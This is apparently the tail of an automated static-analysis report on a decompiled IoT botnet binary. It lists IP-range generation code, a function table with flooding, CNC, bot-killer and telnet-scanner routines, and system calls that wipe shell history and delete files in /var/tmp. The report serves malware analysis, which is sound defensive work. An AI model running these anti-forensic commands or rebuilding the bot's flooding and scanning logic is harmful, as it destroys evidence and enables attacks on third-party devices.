        szprintf(v151, (int32_t)"113.164.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"113.165.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"113.166.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"113.167.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"113.168.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"113.169.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"123.17.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"123.18.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"123.19.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"123.20.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"123.21.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"123.22.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"222.252.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"222.253.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"222.254.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"222.255.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"37.247.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"41.208.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"183.220.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"175.201.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.198.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"183.223.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"50.205.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"88.248.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"88.105.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"88.247.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"85.105.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"188.3.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.203.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.55.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.220.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"183.233.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.242.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.198.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.14.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.195.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.203.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.214.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.218.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.225.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.228.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.231.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.60.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.248.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.253.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.255.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.35.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.49.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.62.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"144.48.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"163.47.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"163.53.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"223.29.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"59.153.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"113.176.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"113.175.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"113.177.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"113.183.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"202.164.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"203.134.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"210.56.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"49.156.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"203.210.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"117.181.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"117.178.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"117.177.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"117.176.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"117.170.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"117.171.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"117.162.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"112.26.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"112.27.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"112.28.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"112.29.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"112.30.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"112.31.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"203.150.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

    inet_addr((int32_t)"8.8.8.8");

================================================================================
========	SYSTEM CALLS SUMMARY : ================================================
================================================================================
            __libc_system(v152);

            __libc_system(v152);

    __libc_system((int32_t)"history -c;history -w");

    __libc_system((int32_t)"cd /root;rm -rf .bash_history");

    return __libc_system((int32_t)"cd /var/tmp; rm -f *");

int32_t __libc_system(int32_t a1) {

================================================================================
========	FUNCTIONS LIST : =======================================================
================================================================================
FUNCTION_NAME                                     |ARGS|LENGH   |SUSPCET_INSTRC|WHILE_INSTRC|
----------------------------------------------------------------------------------------------
processCmd                                        |2   |3270    |373           |645         |
----------------------------------------------------------------------------------------------
GetRandomPublicIP                                 |5   |1405    |214           |0           |
----------------------------------------------------------------------------------------------
main                                              |0   |767     |85            |496         |
----------------------------------------------------------------------------------------------
__dns_lookup                                      |6   |1092    |48            |807         |
----------------------------------------------------------------------------------------------
fdpopen                                           |2   |455     |38            |0           |
----------------------------------------------------------------------------------------------
_memcpy                                           |2   |2426    |35            |1045        |
----------------------------------------------------------------------------------------------
gethostbyname_r                                   |6   |525     |33            |0           |
----------------------------------------------------------------------------------------------
sendTCP                                           |7   |421     |33            |132         |
----------------------------------------------------------------------------------------------
prints                                            |5   |579     |30            |36          |
----------------------------------------------------------------------------------------------
_fpmaxtostr                                       |5   |3539    |29            |3281        |
----------------------------------------------------------------------------------------------
StartTheLelz                                      |2   |726     |29            |530         |
----------------------------------------------------------------------------------------------
sendUDP                                           |8   |363     |27            |95          |
----------------------------------------------------------------------------------------------
__read_etc_hosts_r                                |0   |645     |26            |270         |
----------------------------------------------------------------------------------------------
_ppfs_parsespec                                   |1   |962     |19            |784         |
----------------------------------------------------------------------------------------------
_init                                             |0   |333     |19            |0           |
----------------------------------------------------------------------------------------------
__open_nameservers                                |1   |420     |17            |226         |
----------------------------------------------------------------------------------------------
getOurIP                                          |0   |296     |17            |107         |
----------------------------------------------------------------------------------------------
_stdio_fopen                                      |0   |1023    |13            |0           |
----------------------------------------------------------------------------------------------
print                                             |3   |441     |11            |266         |
----------------------------------------------------------------------------------------------
getBogos                                          |2   |221     |9             |64          |
----------------------------------------------------------------------------------------------
__GI_inet_ntop                                    |4   |491     |9             |313         |
----------------------------------------------------------------------------------------------
__uClibc_main                                     |7   |392     |9             |22          |
----------------------------------------------------------------------------------------------
printi                                            |7   |266     |8             |18          |
----------------------------------------------------------------------------------------------
sendHTTP                                          |6   |202     |8             |29          |
----------------------------------------------------------------------------------------------
negotiate                                         |5   |227     |7             |0           |
----------------------------------------------------------------------------------------------
realloc                                           |2   |327     |7             |0           |
----------------------------------------------------------------------------------------------
sendSTD                                           |4   |192     |7             |26          |
----------------------------------------------------------------------------------------------
getcwd                                            |2   |322     |7             |0           |
----------------------------------------------------------------------------------------------
__GI_memchr                                       |4   |317     |6             |132         |
----------------------------------------------------------------------------------------------
getCores                                          |1   |178     |6             |19          |
----------------------------------------------------------------------------------------------
fdpclose                                          |1   |210     |6             |26          |
----------------------------------------------------------------------------------------------
recvLine                                          |4   |274     |6             |85          |
----------------------------------------------------------------------------------------------
__heap_free                                       |3   |234     |6             |68          |
----------------------------------------------------------------------------------------------
memrchr                                           |4   |297     |6             |122         |
----------------------------------------------------------------------------------------------
sendHTTP2                                         |6   |210     |6             |43          |
----------------------------------------------------------------------------------------------
inet_pton                                         |3   |366     |5             |134         |
----------------------------------------------------------------------------------------------
__modsi3                                          |2   |617     |4             |380         |
----------------------------------------------------------------------------------------------
_vfprintf_internal                                |11  |911     |4             |730         |
----------------------------------------------------------------------------------------------
socket_connect                                    |3   |187     |4             |0           |
----------------------------------------------------------------------------------------------
__aeabi_idiv                                      |2   |568     |4             |228         |
----------------------------------------------------------------------------------------------
readUntil                                         |8   |247     |4             |80          |
----------------------------------------------------------------------------------------------
sendCNC                                           |4   |169     |4             |0           |
----------------------------------------------------------------------------------------------
__udivsi3                                         |2   |512     |4             |212         |
----------------------------------------------------------------------------------------------
sleep                                             |1   |252     |4             |0           |
----------------------------------------------------------------------------------------------
_stdlib_strto_l                                   |0   |655     |4             |131         |
----------------------------------------------------------------------------------------------
__umodsi3                                         |2   |552     |4             |354         |
----------------------------------------------------------------------------------------------
strstr                                            |2   |302     |4             |131         |
----------------------------------------------------------------------------------------------
fflush_unlocked                                   |1   |303     |4             |69          |
----------------------------------------------------------------------------------------------
connectTimeout                                    |4   |207     |3             |0           |
----------------------------------------------------------------------------------------------
listFork                                          |0   |184     |3             |20          |
----------------------------------------------------------------------------------------------
_ppfs_setargs                                     |0   |330     |3             |116         |
----------------------------------------------------------------------------------------------
strncpy                                           |3   |260     |3             |81          |
----------------------------------------------------------------------------------------------
strnlen                                           |1   |343     |3             |107         |
----------------------------------------------------------------------------------------------
sockprintf                                        |2   |162     |3             |0           |
----------------------------------------------------------------------------------------------
trim                                              |1   |214     |3             |39          |
----------------------------------------------------------------------------------------------
botkiller                                         |1   |174     |3             |18          |
----------------------------------------------------------------------------------------------
__GI_wcsnrtombs                                   |5   |343     |3             |65          |
----------------------------------------------------------------------------------------------
initConnection                                    |0   |187     |3             |0           |
----------------------------------------------------------------------------------------------
ClearHistory                                      |0   |156     |3             |0           |
----------------------------------------------------------------------------------------------
_uintmaxtostr                                     |5   |275     |2             |56          |
----------------------------------------------------------------------------------------------
__libc_system                                     |1   |198     |2             |0           |
----------------------------------------------------------------------------------------------
__xpg_strerror_r                                  |0   |286     |2             |70          |
----------------------------------------------------------------------------------------------
__GI_strpbrk                                      |0   |196     |2             |33          |
----------------------------------------------------------------------------------------------
__raise                                           |1   |155     |2             |0           |
----------------------------------------------------------------------------------------------
__vfork                                           |0   |167     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_fclose                                       |1   |199     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_memset                                       |2   |280     |2             |74          |
----------------------------------------------------------------------------------------------
__GI_initstate_r                                  |4   |221     |2             |0           |
----------------------------------------------------------------------------------------------
inet_aton                                         |2   |249     |2             |87          |
----------------------------------------------------------------------------------------------
__decode_dotted                                   |0   |258     |2             |83          |
----------------------------------------------------------------------------------------------
matchPrompt                                       |1   |223     |2             |62          |
----------------------------------------------------------------------------------------------
srandom_r                                         |2   |205     |2             |10          |
----------------------------------------------------------------------------------------------
__GI_strspn                                       |1   |199     |2             |35          |
----------------------------------------------------------------------------------------------
contains_string                                   |2   |180     |2             |15          |
----------------------------------------------------------------------------------------------
strcasestr                                        |3   |209     |2             |50          |
----------------------------------------------------------------------------------------------
__open_etc_hosts                                  |0   |160     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_fgets_unlocked                               |3   |273     |2             |74          |
----------------------------------------------------------------------------------------------
__GI_sigprocmask                                  |4   |195     |2             |0           |
----------------------------------------------------------------------------------------------
__stdio_WRITE                                     |3   |240     |2             |77          |
----------------------------------------------------------------------------------------------
__GI_strchr                                       |2   |245     |2             |88          |
----------------------------------------------------------------------------------------------
makeIPPacket                                      |4   |156     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa                                    |1   |160     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_sendto                                     |6   |164     |1             |0           |
----------------------------------------------------------------------------------------------
inet_pton4                                        |2   |233     |1             |53          |
----------------------------------------------------------------------------------------------
_promoted_size                                    |0   |177     |1             |19          |
----------------------------------------------------------------------------------------------
fgets                                             |3   |168     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_setsockopt                                   |5   |164     |1             |0           |
----------------------------------------------------------------------------------------------
rand                                              |0   |154     |1             |0           |
----------------------------------------------------------------------------------------------
get_telstate_host                                 |3   |155     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_getpid                                     |0   |164     |1             |0           |
----------------------------------------------------------------------------------------------
getHost                                           |2   |155     |1             |0           |
----------------------------------------------------------------------------------------------
getdtablesize                                     |0   |161     |1             |0           |
----------------------------------------------------------------------------------------------
kill                                              |0   |164     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strcasecmp                                   |2   |199     |1             |40          |
----------------------------------------------------------------------------------------------
__heap_alloc                                      |2   |214     |1             |41          |
----------------------------------------------------------------------------------------------
__libc_recv                                       |5   |164     |1             |0           |
----------------------------------------------------------------------------------------------
__length_dotted                                   |0   |183     |1             |16          |
----------------------------------------------------------------------------------------------
sprintf                                           |6   |154     |1             |0           |
----------------------------------------------------------------------------------------------
_stdio_openlist_dec_use                           |1   |223     |1             |33          |
----------------------------------------------------------------------------------------------
read_with_timeout                                 |4   |176     |1             |0           |
----------------------------------------------------------------------------------------------
tcpcsum                                           |4   |160     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strncat                                      |4   |239     |1             |24          |
----------------------------------------------------------------------------------------------
__get_hosts_byname_r                              |7   |154     |1             |0           |
----------------------------------------------------------------------------------------------
szprintf                                          |5   |153     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strcoll                                      |2   |178     |1             |19          |
----------------------------------------------------------------------------------------------
__encode_dotted                                   |1   |247     |1             |60          |
----------------------------------------------------------------------------------------------
parseHex                                          |2   |179     |1             |17          |
----------------------------------------------------------------------------------------------
makeRandomStr                                     |2   |165     |1             |0           |
----------------------------------------------------------------------------------------------
isatty                                            |1   |163     |1             |0           |
----------------------------------------------------------------------------------------------
_charpad                                          |3   |180     |1             |17          |
----------------------------------------------------------------------------------------------
__heap_alloc_at                                   |3   |213     |1             |51          |
----------------------------------------------------------------------------------------------
_stdio_term                                       |0   |196     |1             |13          |
----------------------------------------------------------------------------------------------
__GI_gethostbyname                                |1   |156     |1             |0           |
----------------------------------------------------------------------------------------------
malloc                                            |1   |247     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa_r                                  |0   |178     |1             |17          |
----------------------------------------------------------------------------------------------
__libc_send                                       |4   |164     |1             |0           |
----------------------------------------------------------------------------------------------
srand                                             |1   |157     |1             |0           |
----------------------------------------------------------------------------------------------
sclose                                            |1   |161     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_connect                                    |4   |164     |1             |0           |
----------------------------------------------------------------------------------------------
zprintf                                           |1   |154     |1             |0           |
----------------------------------------------------------------------------------------------
getsockopt                                        |0   |164     |1             |0           |
----------------------------------------------------------------------------------------------
random                                            |0   |159     |1             |0           |
----------------------------------------------------------------------------------------------
__check_one_fd                                    |2   |170     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_creat                                      |1   |164     |1             |0           |
----------------------------------------------------------------------------------------------
GetRandomIP                                       |1   |155     |1             |0           |
----------------------------------------------------------------------------------------------
wait4                                             |0   |164     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_fork                                       |0   |164     |1             |0           |
----------------------------------------------------------------------------------------------
csum                                              |2   |261     |1             |18          |
----------------------------------------------------------------------------------------------
inet_addr                                         |1   |162     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_open                                       |2   |169     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_getsockname                                  |6   |164     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_fopen                                        |2   |154     |1             |0           |
----------------------------------------------------------------------------------------------
rawmemchr                                         |2   |201     |1             |10          |
----------------------------------------------------------------------------------------------
abort                                             |0   |222     |1             |4           |
----------------------------------------------------------------------------------------------
fdgets                                            |4   |179     |1             |21          |
----------------------------------------------------------------------------------------------
getBuild                                          |0   |154     |1             |0           |
----------------------------------------------------------------------------------------------
advance_state                                     |2   |161     |1             |0           |
----------------------------------------------------------------------------------------------
socket                                            |0   |164     |1             |0           |
----------------------------------------------------------------------------------------------
free                                              |0   |218     |1             |0           |
----------------------------------------------------------------------------------------------
inet_ntop4                                        |3   |205     |1             |45          |
----------------------------------------------------------------------------------------------
__libc_waitpid                                    |3   |154     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_vsnprintf                                    |0   |178     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_close                                      |1   |164     |1             |0           |
----------------------------------------------------------------------------------------------
_ppfs_init                                        |1   |214     |1             |36          |
----------------------------------------------------------------------------------------------
__GI_mempcpy                                      |4   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_idivmod                                   |2   |154     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fputs_unlocked                               |2   |164     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_header                                   |2   |154     |0             |0           |
----------------------------------------------------------------------------------------------
init_rand                                         |1   |161     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_getpagesize                                  |0   |161     |0             |0           |
----------------------------------------------------------------------------------------------
__bsd_signal                                      |2   |193     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tcgetattr                                    |0   |166     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sbrk                                         |1   |201     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_exit                                         |1   |165     |0             |0           |
----------------------------------------------------------------------------------------------
read_until_response                               |4   |163     |0             |0           |
----------------------------------------------------------------------------------------------
contains_success                                  |1   |154     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_ctors_aux                             |1   |170     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_brk                                          |1   |162     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2w_o                                 |2   |302     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fwrite_unlocked                              |4   |220     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseeko64                                     |0   |233     |0             |0           |
----------------------------------------------------------------------------------------------
contains_fail                                     |1   |154     |0             |0           |
----------------------------------------------------------------------------------------------
getrlimit                                         |2   |164     |0             |0           |
----------------------------------------------------------------------------------------------
geteuid                                           |0   |165     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_seek                                      |3   |168     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_setsid                                       |0   |164     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_sigaction                                  |3   |191     |0             |0           |
----------------------------------------------------------------------------------------------
function_12ce8                                    |1   |154     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strtok                                       |2   |160     |0             |0           |
----------------------------------------------------------------------------------------------
htons                                             |1   |154     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_toupper                                      |1   |161     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_0                                |0   |154     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_read                                       |1   |167     |0             |0           |
----------------------------------------------------------------------------------------------
setstate                                          |2   |158     |0             |0           |
----------------------------------------------------------------------------------------------
atol                                              |1   |154     |0             |0           |
----------------------------------------------------------------------------------------------
sigemptyset                                       |1   |156     |0             |0           |
----------------------------------------------------------------------------------------------
memmove                                           |4   |156     |0             |0           |
----------------------------------------------------------------------------------------------
strcpy                                            |2   |167     |0             |0           |
----------------------------------------------------------------------------------------------
__muldi3                                          |4   |164     |0             |0           |
----------------------------------------------------------------------------------------------
getegid                                           |0   |165     |0             |0           |
----------------------------------------------------------------------------------------------
__heap_link_free_area_after                       |0   |161     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_error                                   |0   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_nanosleep                                  |3   |164     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_READ                                      |3   |193     |0             |0           |
----------------------------------------------------------------------------------------------
_fini                                             |0   |156     |0             |0           |
----------------------------------------------------------------------------------------------
__default_rt_sa_restorer                          |2   |154     |0             |0           |
----------------------------------------------------------------------------------------------
__length_question                                 |2   |163     |0             |0           |
----------------------------------------------------------------------------------------------
feof                                              |1   |170     |0             |0           |
----------------------------------------------------------------------------------------------
initstate                                         |3   |158     |0             |0           |
----------------------------------------------------------------------------------------------
bcopy                                             |3   |154     |0             |0           |
----------------------------------------------------------------------------------------------
setstate_r                                        |2   |173     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_fcntl                                      |2   |172     |0             |0           |
----------------------------------------------------------------------------------------------
getc_unlocked                                     |1   |313     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_header                                   |5   |166     |0             |0           |
----------------------------------------------------------------------------------------------
strtok_r                                          |0   |178     |0             |0           |
----------------------------------------------------------------------------------------------
__sigismember                                     |2   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___h_errno_location                           |0   |154     |0             |0           |
----------------------------------------------------------------------------------------------
call_frame_dummy                                  |0   |155     |0             |0           |
----------------------------------------------------------------------------------------------
execl                                             |5   |175     |0             |0           |
----------------------------------------------------------------------------------------------
memcpy                                            |0   |156     |0             |0           |
----------------------------------------------------------------------------------------------
ntohs                                             |1   |154     |0             |0           |
----------------------------------------------------------------------------------------------
ioctl                                             |3   |166     |0             |0           |
----------------------------------------------------------------------------------------------
uppercase                                         |1   |174     |0             |0           |
----------------------------------------------------------------------------------------------
_24_d_1                                           |3   |170     |0             |0           |
----------------------------------------------------------------------------------------------
_stdio_init                                       |0   |163     |0             |0           |
----------------------------------------------------------------------------------------------
_fp_out_narrow                                    |4   |223     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseek                                        |0   |154     |0             |0           |
----------------------------------------------------------------------------------------------
_store_inttype                                    |4   |170     |0             |0           |
----------------------------------------------------------------------------------------------
_ppfs_prepargs                                    |2   |160     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcrtomb                                      |3   |180     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_pipe                                         |1   |167     |0             |0           |
----------------------------------------------------------------------------------------------
rand_cmwc                                         |0   |172     |0             |0           |
----------------------------------------------------------------------------------------------
call___do_global_dtors_aux                        |0   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_random_r                                     |2   |185     |0             |0           |
----------------------------------------------------------------------------------------------
__default_sa_restorer                             |2   |154     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_adjust_position                           |2   |374     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_fini                                |1   |167     |0             |0           |
----------------------------------------------------------------------------------------------
getgid                                            |1   |164     |0             |0           |
----------------------------------------------------------------------------------------------
getuid                                            |0   |165     |0             |0           |
----------------------------------------------------------------------------------------------
contains_response                                 |1   |160     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fputs                                        |2   |168     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fcntl64                                      |0   |165     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_init                                |1   |161     |0             |0           |
----------------------------------------------------------------------------------------------
isspace                                           |1   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_init_mutex                                |0   |160     |0             |0           |
----------------------------------------------------------------------------------------------
__heap_link_free_area                             |0   |167     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_select                                     |5   |164     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_answer                                   |4   |175     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_fwrite                                    |3   |240     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_time                                         |1   |164     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sigaddset                                    |2   |167     |0             |0           |
----------------------------------------------------------------------------------------------
htonl                                             |1   |154     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_rfill                                     |1   |156     |0             |0           |
----------------------------------------------------------------------------------------------
function_18828                                    |1   |154     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___glibc_strerror_r                           |3   |155     |0             |0           |
----------------------------------------------------------------------------------------------
_24_d                                             |3   |161     |0             |0           |
----------------------------------------------------------------------------------------------
prctl                                             |0   |164     |0             |0           |
----------------------------------------------------------------------------------------------
reset_telstate                                    |3   |154     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2r_o                                 |0   |213     |0             |0           |
----------------------------------------------------------------------------------------------
__GI__exit                                        |1   |155     |0             |0           |
----------------------------------------------------------------------------------------------
printchar                                         |2   |166     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_dtors_aux                             |0   |175     |0             |0           |
----------------------------------------------------------------------------------------------
strcat                                            |2   |175     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_wcommit                                   |0   |167     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcsrtombs                                    |0   |158     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strdup                                       |1   |156     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_poll                                       |8   |164     |0             |0           |
----------------------------------------------------------------------------------------------
__sigdelset                                       |2   |156     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_lseek64                                    |6   |172     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_uidivmod                                  |2   |154     |0             |0           |
----------------------------------------------------------------------------------------------
_dl_aux_init                                      |1   |156     |0             |0           |
----------------------------------------------------------------------------------------------
wildString                                        |2   |218     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tolower                                      |1   |161     |0             |0           |
----------------------------------------------------------------------------------------------
_start                                            |2   |155     |0             |0           |
----------------------------------------------------------------------------------------------
_load_inttype                                     |0   |197     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_question                                 |7   |164     |0             |0           |
----------------------------------------------------------------------------------------------
call___do_global_ctors_aux                        |0   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_ldiv0                                     |0   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_void                             |0   |155     |0             |0           |
----------------------------------------------------------------------------------------------
usleep                                            |1   |154     |0             |0           |
----------------------------------------------------------------------------------------------
ntohl                                             |1   |154     |0             |0           |
----------------------------------------------------------------------------------------------
